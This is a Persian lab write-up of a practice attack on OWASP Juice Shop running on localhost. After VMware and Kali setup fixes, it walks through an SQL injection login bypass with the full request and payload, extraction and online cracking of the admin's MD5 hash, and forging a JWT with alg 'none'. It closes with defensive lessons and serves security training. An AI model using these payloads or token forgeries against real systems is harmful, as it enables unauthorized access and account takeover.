📋 گزارش دقیق مسیرهای طی‌شده

همه‌ی دستورات، آدرس‌ها، فایل‌ها و قدم‌های عملی از ابتدا تا انتها

🖥️ ۱. رفع مشکل VMware (خطای قفل دیسک)

۱

مشکل: هنگام روشن کردن ماشین مجازی، خطای زیر ظاهر شد:

The process cannot access the file because another process has locked a portion of the file Cannot open the disk 'D:\Kalilinux\Debian 10.x-1-000001.vmdk'
۲

علت: فایل‌های قفل موقت (.lck) پس از بسته‌شدن ناگهانی VMware باقی مانده بودند.

۳

راه‌حل:

  • رفتن به مسیر: D:\Kalilinux\
  • حذف فایل‌های .lck:
# فایل‌های حذف‌شده Debian 10.x-1-000001.vmdk.lck Debian 10.x-000001.vmdk.lck
✅ نتیجه: ماشین مجازی بدون مشکل استارت خورد و محیط کالی در دسترس قرار گرفت.

🌐 ۲. رفع مشکل شبکه و ریپازیتوری کالی

۱

مشکل: هنگام نصب ابزار hashcat، ارور 403 Forbidden و 404 Not Found از سرورهای کالی دریافت شد.

۲

علت: سرورهای پیش‌فرض کالی (http.kali.org) در دسترس نبودند.

۳

راه‌حل: تغییر فایل /etc/apt/sources.list:

# nano /etc/apt/sources.list deb http://archive.kali.org/kali kali-rolling main non-free contrib deb-src http://archive.kali.org/kali kali-rolling main non-free contrib
۴

دستورات اجرا شده:

sudo apt update sudo apt install hashcat -y
✅ نتیجه: ریپازیتوری جدید با موفقیت شناسایی شد و hashcat نصب گردید.

⚡ ۳. حمله‌ی SQL Injection و ورود به پنل ادمین

۱

هدف: دورزدن فرم لاگین و ورود به حساب ادمین.

آدرس فرم لاگین: http://127.0.0.1:3000/#/login

۲

درخواست ارسالی:

POST /rest/user/login HTTP/1.1 Host: 127.0.0.1:3000 Content-Type: application/json {"email":"' OR 1=1;--", "password":"abc"}
۳

کوئری ساخته‌شده در پشت‌صحنه:

SELECT * FROM users WHERE email = '' OR 1=1;--' AND password = 'abc'

بخش ' OR 1=1 شرط را همیشه TRUE می‌کند و -- بقیه‌ی کوئری را به توضیح (Comment) تبدیل می‌کند.

۴

پاسخ سرور:

HTTP/1.1 200 OK { "authentication": { "token": "eyJhbGciOiJSUzI1NiIs...", "bid": 1 } }
✅ نتیجه: چالش Login Admin با موفقیت حل شد و توکن ادمین دریافت گردید.

📂 ۴. استخراج اطلاعات کاربر ادمین از دیتابیس

۱

اطلاعات استخراج‌شده:

👤 مشخصات کاربر
id: 1
email: admin@juice-sh.op
role: admin
isActive: true
bid: 1
🔑 هش رمز عبور
0192023a7bbd73250516f069df18b500
📌 نکته: هش رمز عبور از نوع MD5 است و با ابزار hashcat یا سایت‌های کرک آنلاین قابل شکستن می‌باشد.

🔓 ۵. کرک هش رمز عبور با CrackStation

۱

روش:

  • رفتن به سایت: https://crackstation.net
  • چسباندن هش 0192023a7bbd73250516f069df18b500 در قسمت ورودی
  • کلیک روی دکمه‌ی "Crack Hashes"
۲

نتیجه:

رمز عبور پیدا شده: admin123
✅ نتیجه: رمز عبور واقعی ادمین (admin123) با موفقیت بازیابی شد.

🔄 ۶. دستکاری JWT در Repeater

۱

مراحل:

  • درخواست GET /rest/user/me را در Proxy → HTTP History پیدا کردم.
  • روی آن راست‌کلیک کرده و "Send to Repeater" را انتخاب کردم.
  • هدر Authorization: Bearer <token> را در Repeater مشاهده کردم.
۲

تغییرات اعمال‌شده روی توکن:

  • توکن در Repeater انتخاب و به JSON Web Token tab منتقل شد.
  • در بخش Payload، مقدار "email": "admin@juice-sh.op" به "email": "customer@juice-sh.op" تغییر یافت.
  • برای امضای مجدد، الگوریتم به none تغییر داده شد (برای دورزدن امضا).
۳

توکن نهایی ساخته‌شده:

eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJkYXRhIjp7ImVtYWlsIjoiY3VzdG9tZXJAanVpY2Utc2hvcC5vcCIsImlkIjoxLCJyb2xlIjoiYWRtaW4ifSwiaWF0IjoxNzI0NTk0MDg1LCJleHAiOjE3MjQ1OTc2ODV9.
۴

ارسال درخواست:

  • توکن جدید در هدر Authorization قرار داده شد.
  • دکمه‌ی Send در Repeater کلیک شد.
📌 نکته: سرور ممکن است الگوریتم none را قبول نکند. در این صورت باید از کلید secret برای امضای مجدد با الگوریتم HS256 استفاده شود.

🏁 ۷. جمع‌بندی نهایی

  • 🖥️ VMware: خطای قفل دیسک با حذف فایل‌های .lck از مسیر D:\Kalilinux\ برطرف شد.
  • 🌐 شبکه: ریپازیتوری کالی از http.kali.org به archive.kali.org تغییر یافت و hashcat نصب شد.
  • ⚡ SQL Injection: با تزریق ' OR 1=1;-- در فرم لاگین، احراز هویت دور زده شد و توکن ادمین دریافت گردید.
  • 📂 استخراج اطلاعات: هش رمز عبور ادمین (0192023a7bbd73250516f069df18b500) از دیتابیس استخراج شد.
  • 🔓 کرک هش: با استفاده از سایت crackstation.net، رمز عبور admin123 بازیابی شد.
  • 🔄 دستکاری JWT: توکن ادمین در Repeater تغییر داده شد تا ایمیل به customer@juice-sh.op تبدیل گردد.
🎯 درس آموخته: ترکیب آسیب‌پذیری‌های ساده مانند SQL Injection و ضعف در مدیریت توکن‌های JWT می‌تواند امنیت کل سیستم را به خطر بیندازد. همواره ورودی‌ها را پالایش کرده، از کوئری‌های پارامتری استفاده کنید و الگوریتم‌های امضای قوی (مانند RS256 با کلید خصوصی امن) را برای توکن‌ها به کار بگیرید.
